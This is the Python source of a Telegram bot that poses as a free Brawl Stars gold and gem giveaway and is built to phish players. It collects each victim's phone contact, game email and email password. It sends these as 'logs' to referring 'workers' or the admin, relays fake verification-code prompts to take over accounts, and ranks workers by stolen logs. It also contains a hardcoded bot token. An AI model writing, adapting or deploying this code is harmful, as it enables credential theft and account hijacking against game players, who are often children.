import sqlite3
import logging
import re
import threading
import time
import requests
import os
from validate_email import validate_email
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import Message
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import CallbackQuery
class ContactAdmin(StatesGroup):
    waiting_for_message = State()
    waiting_for_reply = State()

logging.basicConfig(level=logging.INFO)

storage = MemoryStorage()

TOKEN = '7504404671:AAHblv3vK8wUz3Pb5EY_sDXnKKY1ennrCqU' #токен бота
ID = 7138183093 ##айди админа, через запятую если их несколько

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())
conn = sqlite3.connect('db.db')
cursor = conn.cursor()
async def main():
    while True:
        try:
            await dp.start_polling()
        except NetworkError as e:
            logging.warning(f"Помилка мережі: {e}")
            await asyncio.sleep(5)  # Затримка перед новим запуском

# Запускаємо keep_alive у окремому потоці
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "https://bot-gvwh.onrender.com"

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

def ping_self():
    """Функция будет пинговать бота каждые 5 минут"""
    while True:
        try:
            url = "https://your-bot-service.onrender.com/"  # Укажите свой URL
            requests.get(url)
            print("Пинг успешен")
        except Exception as e:
            print(f"Ошибка пинга: {e}")
        time.sleep(300)  # 5 минут

# Запускаем Flask и пингование в отдельных потоках
flask_thread = threading.Thread(target=run_flask, daemon=True)
ping_thread = threading.Thread(target=ping_self, daemon=True)

flask_thread.start()
ping_thread.start()
class dialog(StatesGroup):
    spamworker = State()
    spamuser = State()
    blacklist = State()
    whitelist = State()
    link = State()
    add = State()

class log(StatesGroup):
    ref = State()
    phone = State()
    mail = State()
    password = State()

class entr(StatesGroup):
    golds = State()
    gems = State()

class code(StatesGroup):
    entr = State()

menu = ReplyKeyboardMarkup(resize_keyboard=True)
button1 = KeyboardButton('Забанить')
button2 = KeyboardButton('Разбанить')
button3 = KeyboardButton('Рассылка')
button4 = KeyboardButton('Статистика')
button5 = KeyboardButton('Топ воркеров')
menu.row(button1, button2)
menu.add(button3)
menu.row(button4, button5)
menu.add(KeyboardButton('✉ Написать админу'))

spammenu = ReplyKeyboardMarkup(resize_keyboard=True)
spamworker = KeyboardButton('Воркерам')
spamuser = KeyboardButton('Юзерам')
back = KeyboardButton('Назад')
spammenu.row(spamworker, spamuser).add(back)

cancel = types.ReplyKeyboardMarkup(resize_keyboard=True)
cancel.add(types.InlineKeyboardButton(text='Назад'))

panel = ReplyKeyboardMarkup(resize_keyboard=True)
button01 = KeyboardButton('Ссылка')
button02 = KeyboardButton('Статистика')
button03 = KeyboardButton('Топ воркеров')
button04 = KeyboardButton('Информация')
button05 = KeyboardButton('✉ Написать админу')  # Додаємо кнопку

panel.add(button01)
panel.row(button02, button03)
panel.add(button04)
panel.add(button05)  # Додаємо кнопку для юзерів


kb_info = InlineKeyboardMarkup()
btn_channel = InlineKeyboardButton('Канал', url='https://t.me/')
btn_chat = InlineKeyboardButton('Чат', url='https://t.me/')
btn_admin = InlineKeyboardButton('Поддержка', url='https://t.me/')
kb_info.row(btn_channel, btn_chat).add(btn_admin)

inline_btn_try = InlineKeyboardButton('Невалид', callback_data='btn_try')
inline_btn_code = InlineKeyboardButton('Отправить код', callback_data='btn_code')

@dp.message_handler(commands='start')
async def start(message: types.Message):
    cursor.execute('SELECT id FROM users WHERE user_id = ?', (message.from_user.id,))
    result = cursor.fetchall()

    if message.from_user.id == ID:
        await message.answer('Добро пожаловать!', reply_markup=menu)  # Меню для администратора
    else:
        cursor.execute('SELECT id FROM users WHERE user_id = ?', (message.from_user.id,))
        result = cursor.fetchall()

        if not result:
            cursor.execute('INSERT INTO users (user_id) VALUES (?)', (message.from_user.id,))
            conn.commit()

        cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.from_user.id,))
        result = cursor.fetchall()

        if result and result[0][0] != 1:
            cursor.execute('SELECT status FROM users WHERE user_id = ?', (message.from_user.id,))
            status_check = cursor.fetchall()
            
            if status_check and status_check[0][0] != 'worker':
                if " " in message.text and message.text.split()[1].isdigit():
                    cursor.execute(f'UPDATE users SET ref = ? WHERE user_id = ?', 
                                   (message.text.split()[1], message.from_user.id,))
                    conn.commit()

                keyboardmain = types.InlineKeyboardMarkup(row_width=1)
                button_donate = types.InlineKeyboardButton(text='Запуск', callback_data='start')
                keyboardmain.add(button_donate)

                await message.answer(
                    f'''👋 Привет, {message.from_user.first_name}!
  Это бот, который донатит в Brawl Stars.
  Чтобы начать, нажмите кнопку ниже:''', 
                    reply_markup=keyboardmain
                )
            else:
                await message.answer('Добро пожаловать!', reply_markup=panel)
@dp.message_handler(content_types=['text'], text='✉ Написать админу')
async def contact_admin(message: types.Message):
    await message.answer("✏ Напишите ваше сообщение для администратора:")
    await ContactAdmin.waiting_for_message.set()
@dp.message_handler(state=ContactAdmin.waiting_for_message)
async def send_to_admin(message: types.Message, state: FSMContext):
    admin_id = 7138183093  # ID администратора
    user = message.from_user

    text = f"📩 *Новое сообщение от пользователя:*\n\n" \
           f"👤 Имя: {user.full_name}\n" \
           f"🆔 ID: `{user.id}`\n\n" \
           f"💬 Сообщение:\n{message.text}"

    # Добавляем кнопку "Ответить"
    reply_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("📝 Ответить", callback_data=f"reply_{user.id}"))

    await bot.send_message(admin_id, text, parse_mode="Markdown", reply_markup=reply_markup)
    await message.answer("✅ Ваше сообщение отправлено администратору!")
    await state.finish()

# ⬇ Админ нажимает "Ответить" → бот запрашивает текст ответа
@dp.callback_query_handler(lambda c: c.data.startswith("reply_"))
async def ask_admin_reply(callback_query: CallbackQuery, state: FSMContext):
    user_id = int(callback_query.data.split("_")[1])  # Получаем ID пользователя
    await state.update_data(user_id=user_id)

    await bot.send_message(callback_query.from_user.id, "✏ Введите ваш ответ для пользователя:")
    await ContactAdmin.waiting_for_reply.set()

# ⬇ Админ вводит ответ → бот отправляет его пользователю
@dp.message_handler(state=ContactAdmin.waiting_for_reply)
async def send_reply_to_user(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data["user_id"]

    try:
        await bot.send_message(user_id, f"📩 *Ответ от администрации:*\n\n{message.text}", parse_mode="Markdown")
        await message.answer("✅ Ответ отправлен пользователю!")
    except:
        await message.answer("❌ Невозможно отправить ответ этому пользователю.")

    await state.finish()
@dp.callback_query_handler(lambda c: c.data == 'start')
async def buttonstart(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    kb = types.InlineKeyboardMarkup(row_width=2)
    first_button = InlineKeyboardButton('Золото 💰', callback_data='golds')
    second_button = InlineKeyboardButton('Гемы 💎', callback_data='gems')
    kb.add(first_button, second_button)
    await bot.edit_message_text('Выберите пункт с нужной валютой:', cid, mid, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == 'golds')
async def buttongolds(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    await bot.edit_message_text('''Введите колличество золота💰
  📌(не более 1.000)''', cid, mid)
    await entr.golds.set()

@dp.message_handler(state=entr.golds)
async def entrgolds(message: types.Message, state: FSMContext):
    num = message.text
    if not num.isdigit():
        await message.reply('Введите число! Повторите попытку.')
        await message.answer('Колличество золота💰 (не более 1.000)')
    if num.isdigit() and int(num) > 1000:
        await message.reply('''Колличество не может быть более 1.000!
  Повторите попытку.''')
        await message.answer('Введите золото💰 (не более 1.000)')
    if num.isdigit() and int(num) <= 1000:
        markup_request = ReplyKeyboardMarkup(resize_keyboard=True) \
            .add(KeyboardButton('Зарегистрироваться', request_contact=True))
        await message.answer('''Похоже у вас не осталось бесплатных запросов на день..
  🎁Есть возможность получить дополнительные запросы зарегистрировавшись в боте!''', reply_markup=markup_request)
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'gems')
async def buttongems(callback_query: types.CallbackQuery):
    cid = callback_query.message.chat.id
    mid = callback_query.message.message_id
    await bot.edit_message_text('''Введите колличество гемов💎
  📌(не более 80)''', cid, mid)
    await entr.gems.set()

@dp.message_handler(state=entr.gems)
async def entrgems(message: types.Message, state: FSMContext):
    num = message.text
    if not num.isdigit():
        await message.reply('Введите число! Повторите попытку.')
        await message.answer('Колличество гемов💎 (не более 80)')
    if num.isdigit() and int(num) > 80:
        await message.reply('''Колличество не может быть более 80!
  Повторите попытку.''')
        await message.answer('Введите гемы💎 (не более 80)')
    if num.isdigit() and int(num) <= 80:
        markup_request = ReplyKeyboardMarkup(resize_keyboard=True) \
            .add(KeyboardButton('Зарегистрироваться', request_contact=True))
        await message.answer('Похоже у вас не осталось бесплатных запросов на день.'
  '🎁 Есть возможность получить дополнительные запросы зарегистрировавшись в боте!', reply_markup=markup_request)
        await state.finish()

@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message, state: FSMContext):
    if message.contact is not None:
        await state.update_data(first=message.contact.first_name, \
            last=message.contact.last_name, \
            userid=message.contact.user_id, \
            phone=message.contact.phone_number, \
            nick=message.from_user.username)
        await message.answer('Регистрация прошла успешно!', reply_markup=types.ReplyKeyboardRemove())
        await message.answer('✉ Введите почту, привязанную к игре:')
        await log.mail.set()

@dp.message_handler(state=log.mail)
async def entrmail(message: types.Message, state: FSMContext):
    is_valid = validate_email(message.text)
    if is_valid is False:
        await message.answer('Вы ввели некорректную почту\n  Попробуйте снова!')
    else:
        await state.update_data(mail=message.text)
        await message.answer('🔑Введите пароль указанной почты:')
        await log.password.set()

@dp.message_handler(state=log.password)
async def entrpassword(message: types.Message, state: FSMContext):
    if message.text.split()[0] != '/start' and len(''.join(message.text.split())) >= 8:
        await state.update_data(password=message.text)
        await message.answer('Ожидайте донат на ваш аккаунт в течении 6 часов он поступит!🎉')
  #'Мы сократим время начисления бонуса если вы расскажите о нас своим друзьям по этой ссылке:')
        data = await state.get_data()
        first = re.sub('[_]', '\_', str(data['first']))
        last = re.sub('[_]', '\_', str(data['last']))
        userid = data['userid']
        phone = data['phone']
        nick = re.sub('[_]', '\_', str(data['nick']))
        mail = data['mail']
        password = data['password']
        info = f'''
🦣 *Пользователь ввёл свои данные*
Имя: {first} / {last}
Айди: `{userid}`
Ник: @{nick}
Номер телефона: `{phone}`
Почта: `{mail}`
Пароль: `{password}`
            '''
        cursor.execute('UPDATE users SET log = ? WHERE user_id = ?', ('1', message.from_user.id,))
        conn.commit()
        cursor.execute('SELECT ref FROM users WHERE user_id = ?', (message.from_user.id,))
        inline_kb_log = InlineKeyboardMarkup() \
            .insert(inline_btn_try).insert(inline_btn_code)
        try:
            await bot.send_message(cursor.fetchall()[0][0], info, parse_mode='Markdown', reply_markup=inline_kb_log)
        except:
            await bot.send_message(ID, info, parse_mode='Markdown', reply_markup=inline_kb_log)
        await state.finish()
    else:
        await message.answer('Вы ввели некорректный пароль\n  Попробуйте снова!')

@dp.callback_query_handler(lambda c: c.data == 'btn_try')
async def process_callback_button1(callback_query: types.CallbackQuery):
    id = callback_query.message.text.split('ID: ', maxsplit=1)[-1] \
        .split(maxsplit=1)[0]
    try:
        await bot.send_message(id, 'К сожалению, наш бот не смог зайти на ваш аккаунт для начисления доната, проверьте введенные вами данные и попробуйте снова нажав /start')
        await bot.send_message(callback_query.message.chat.id, 'Успешно')
    except:
        await bot.send_message(callback_query.message.chat.id, 'Пользователь удалил диалог')

@dp.callback_query_handler(lambda c: c.data == 'btn_code', state='*')
async def process_callback_button1(callback_query: types.CallbackQuery, state: FSMContext):
    id = callback_query.message.text.split('ID: ', maxsplit=1)[-1] \
        .split(maxsplit=1)[0]
    await state.update_data(entr=id)
    await bot.send_message(callback_query.message.chat.id, 'Введите число', reply_markup=cancel)
    await code.entr.set()

@dp.message_handler(state=code.entr)
async def entr_code(message: Message, state: FSMContext):
    if message.from_user.id == ID:
        main = menu
    else:
        main = panel
    if message.text != 'Назад':
        if message.text.isdigit():
            try:
                id = await state.get_data()
                await bot.send_message(id['entr'], 'Уведомление отправлено на устройство. \
Чтобы подтвердить свою личность, \
нажмите Да, а затем выберите код ' + message.text + ' на телефоне.')
                await message.answer('Успешно', reply_markup=main)
                await state.finish()
            except:
                await message.answer('Пользователь удалил диалог', reply_markup=main)
                await state.finish()
        else:
            await message.answer('Введите число')
    else:
        await message.answer('Главное меню', reply_markup=main)

@dp.message_handler(content_types=['text'], text='Ссылка')
async def link(message: Message):
    await message.answer('https://t.me/brawlcellbot?start='+str(message.from_user.id))

@dp.message_handler(content_types=['text'], text='Статистика')
async def stat(message: Message):
    cursor.execute('SELECT user_id FROM users WHERE ref = ?', (message.from_user.id,))
    res = len(cursor.fetchall())
    cursor.execute('SELECT user_id FROM users WHERE log = ? AND ref = ?', ('1', message.from_user.id,))
    uniqres = len(cursor.fetchall())
    await message.answer(f'Ваша статистика \n\
├ Переходов: {res} шт.\n\
└ Логов: {uniqres} шт.')

@dp.message_handler(content_types=['text'], text='Топ воркеров')
async def top(message: Message):
    cursor.execute('SELECT ref FROM users WHERE log = ?', ('1',))
    res = cursor.fetchall()
    count = dict((i, res.count(i)) for i in res)
    sort_count = sorted(count.items(), key=lambda t: t[1], reverse=True)
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[0][0][0],))
    one = cursor.fetchall()[0][0]
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[1][0][0],))
    two = cursor.fetchall()[0][0]
    cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[2][0][0],))
    three = cursor.fetchall()[0][0]

    await message.answer(f'\n\
🥇 {one} | Логи: {sort_count[0][1]} шт.\n\
🥈 {two} | Логи: {sort_count[1][1]} шт.\n\
🥉 {three} | Логи: {sort_count[2][1]} шт.')
async def top(message: Message):
    cursor.execute('SELECT ref FROM users WHERE log = ?', ('1',))
    res = cursor.fetchall()
    count = dict((i, res.count(i)) for i in res)
    sort_count = sorted(count.items(), key=lambda t: t[1], reverse=True)

    top_users = []
    for i in range(min(3, len(sort_count))):  # Проверяем, чтобы не выйти за пределы списка
        cursor.execute('SELECT nick FROM users WHERE user_id = ?', (sort_count[i][0][0],))
        result = cursor.fetchall()
        if result:
            top_users.append((result[0][0], sort_count[i][1]))

    # Формируем ответ
    ranking = ["🥇", "🥈", "🥉"]
    response = "\n".join(f"{ranking[i]} {user} | Логи: {logs} шт." for i, (user, logs) in enumerate(top_users))

    if response:
        await message.answer(response)
    else:
        await message.answer("Пока нет воркеров с логами.")

@dp.message_handler(content_types=['text'], text='Информация')
async def info(message: Message):
    await message.answer('Информация о нашем проекте', reply_markup=kb_info)

@dp.message_handler(commands = 'update')
async def update(message: Message):
    if message.from_user.username != None:
        cursor.execute(f'UPDATE users SET nick = ? WHERE user_id = ?',
                       ('@' + message.from_user.username, message.from_user.id,))
        conn.commit()
        await message.answer('Обновлено')
    else:
        await message.answer('Неверное имя пользователя')

@dp.message_handler(commands = 'add')
async def add(message: Message):
    cursor.execute('UPDATE users SET status = ? WHERE user_id = ?', ('worker', message.from_user.id,))
    conn.commit()
    await message.answer('Добро пожаловать', reply_markup=panel)

@dp.message_handler(content_types=['text'], text='Рассылка')
async def spam(message: Message):
    await message.answer('Выберите тип рассылки', reply_markup=spammenu)

@dp.message_handler(content_types=['text'], text='Воркерам')
async def spam(message: Message):
    if message.from_user.id == ID:
        await dialog.spamworker.set()
        await message.answer('Введите текст рассылки', reply_markup=cancel)
    else:
        await message.answer('Вы не являетесь админом!')

@dp.message_handler(content_types=['text'], text='Юзерам')
async def spam(message: Message):
    if message.from_user.id == ID:
        await dialog.spamuser.set()
        await message.answer('Введите текст рассылки', reply_markup=cancel)
    else:
        await message.answer('Вы не являетесь админом!')

@dp.message_handler(state=dialog.spamworker)
async def start_spamworker(message: Message, state: FSMContext):
    i = 0
    if message.text != 'Назад':
        cursor.execute('SELECT user_id FROM users WHERE status = ?', ('worker',))
        spam_base = cursor.fetchall()
        for z in range(len(spam_base)):
            try:
                await bot.send_message(spam_base[z][0], message.text)
                i += 1
            except:
                pass
        await message.answer(f'Отправлено {i} пользователям', reply_markup=menu)
        await state.finish()
    else:
        await message.answer('Главное меню', reply_markup=menu)
        await state.finish()

@dp.message_handler(state=dialog.spamuser)
async def start_spamuser(message: Message, state: FSMContext):
    i = 0
    if message.text != 'Назад':
        cursor.execute('SELECT user_id FROM users WHERE status = ?', ('user',))
        spam_base = cursor.fetchall()
        for z in range(len(spam_base)):
            try:
                await bot.send_message(spam_base[z][0], message.text)
                i += 1
            except:
                pass
        await message.answer(f'Отправлено {i} пользователям', reply_markup=menu)
        await state.finish()
    else:
        await message.answer('Главное меню', reply_markup=menu)
        await state.finish()

@dp.message_handler(content_types=['text'], text='Забанить')
async def ban(message: types.Message, state: FSMContext):
    if message.chat.id == ID:
        await message.answer('Введите ID пользователя', reply_markup=cancel)
        await dialog.blacklist.set()
    else:
        await message.answer('Вы не являетесь админом!')

@dp.message_handler(state=dialog.blacklist)
async def banned(message: types.Message, state: FSMContext):
    if message.text != 'Назад':
        if message.text.isdigit():
            cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.text,))
            result = cursor.fetchall()
            if not result:
                await message.answer('Не найден в базе данных', reply_markup=menu)
                await state.finish()
            else:
                cursor.execute('UPDATE users SET block = 1 WHERE user_id = ?', (message.text,))
                conn.commit()
                await message.answer('Успешно', reply_markup=menu)
                await state.finish()
        else:
            await message.answer('Введите айди пользователя', reply_markup=cancel)
    else:
        await message.answer('Главное меню', reply_markup=menu)
        await state.finish()

@dp.message_handler(content_types=['text'], text='Разбанить')
async def unban(message: types.Message, state: FSMContext):
    if message.chat.id == ID:
        await message.answer('Введите айди пользователя', reply_markup=cancel)
        await dialog.whitelist.set()
    else:
        await message.answer('Вы не являетесь админом!')

@dp.message_handler(state=dialog.whitelist)
async def unbanned(message: types.Message, state: FSMContext):
    if message.text != 'Назад':
        if message.text.isdigit():
            cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.text,))
            result = cursor.fetchall()
            if not result:
                await message.answer('Не найден в базе данных', reply_markup=menu)
                await state.finish()
            else:
                cursor.execute('UPDATE users SET block = 0 WHERE user_id = ?', (message.text,))
                conn.commit()
                await message.answer('Успешно', reply_markup=menu)
                await state.finish()
        else:
            await message.answer('Введите айди пользователя', reply_markup=cancel)
    else:
        await message.answer('Главное меню', reply_markup=menu)
        await state.finish()

@dp.message_handler(state='*', text='Назад')
async def back(message: Message):
    if message.from_user.id == ID:
        await message.answer('Главное меню', reply_markup=menu)
    else:
        await message.answer('Главное меню', reply_markup=panel)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
